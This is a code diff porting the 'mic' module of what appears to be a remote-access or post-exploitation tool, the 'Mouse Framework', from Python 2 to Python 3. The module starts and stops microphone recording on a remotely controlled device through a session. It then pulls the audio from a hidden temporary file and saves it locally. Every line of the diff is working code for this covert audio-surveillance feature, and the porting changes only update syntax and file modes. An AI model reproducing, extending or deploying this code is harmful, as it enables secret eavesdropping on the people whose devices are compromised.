@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #            ---------------------------------------------------
 #                              Mouse Framework                                 
@@ -26,33 +26,34 @@ import os
 class command:
     def __init__(self):
         self.name = "mic"
-        self.description = "Record mic sound."
+        self.description = "Record microphone sound."
         self.usage = "Usage: mic [start|stop <local_path>]"
         
     def run(self,session,cmd_data):
         if not cmd_data['args']:
-            print self.usage
+            print(self.usage)
+            return
         else:
             if cmd_data['args'].split()[0] == "start":
                 pass
             else:
                 if len(cmd_data['args'].split()) < 2 or cmd_data['args'].split()[0] != "stop":
-                    print self.usage
-            	    return
+                    print(self.usage)
+                    return
 		
         if cmd_data['args'].split()[0] == "stop":
-	    dest = cmd_data['args'].split()[1]
-	    cmd_data['args'] = "stop"
+            dest = cmd_data['args'].split()[1]
+            cmd_data['args'] = "stop"
             if os.path.isdir(dest):
                 if os.path.exists(dest):
-		    h.info_general("Stopping record...")
+                    h.info_general("Stopping record...")
                     result = json.loads(session.send_command(cmd_data))
                     if 'error' in result:
                         h.info_error("Failed to record mic!")
-			return
+                        return
                     elif 'status' in result and result['status'] == 1:
                         data = session.download_file("/tmp/.avatmp")
-                        f = open(os.path.join(dest,'mic.caf'),'w')
+                        f = open(os.path.join(dest,'mic.caf'),'wb')
                         f.write(data)
                         f.close()
                     if dest[-1] == "/":
@@ -67,22 +68,22 @@ class command:
                     h.info_error("Local directory: "+dest+": does not exist!")
             else:
                 rp = os.path.split(dest)[0]
-		if rp == "":
-		    rp = "."
-		else:
-		    pass
+                if rp == "":
+                    rp = "."
+                else:
+                    pass
                 if os.path.exists(rp):
-		    if os.path.isdir(rp):
-			pr = os.path.split(dest)[0]
+                    if os.path.isdir(rp):
+                        pr = os.path.split(dest)[0]
                         rp = os.path.split(dest)[1]
-			h.info_general("Stopping record...")
+                        h.info_general("Stopping record...")
                         result = json.loads(session.send_command(cmd_data))
                         if 'error' in result:
                             h.info_error("Failed to record mic!")
-			    return
+                            return
                         elif 'status' in result and result['status'] == 1:
                             data = session.download_file("/tmp/.avatmp")
-                            f = open(os.path.join(pr,rp),'w')
+                            f = open(os.path.join(pr,rp),'wb')
                             f.write(data)
                             f.close()
                         h.info_general("Saving to "+dest+"...")
@@ -92,8 +93,8 @@ class command:
                         h.info_error("Error: "+rp+": not a directory!")
                 else:
                     h.info_error("Local directory: "+rp+": does not exist!")
-        
+
         elif cmd_data['args'].split()[0] == "start":
-	    cmd_data['args'] = "record"
+            cmd_data['args'] = "record"
             h.info_general("Starting record...")
             session.send_command(cmd_data)
